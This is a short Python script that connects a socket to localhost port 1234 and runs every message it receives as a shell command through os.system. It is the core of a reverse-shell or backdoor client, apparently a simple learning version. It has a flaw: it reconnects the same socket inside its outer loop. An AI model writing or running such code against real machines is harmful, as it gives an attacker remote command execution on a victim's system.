import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    s.connect(('localhost', 1234))

    while True:
        msg = s.recv(1024)
        os.system(msg.decode("utf-8"))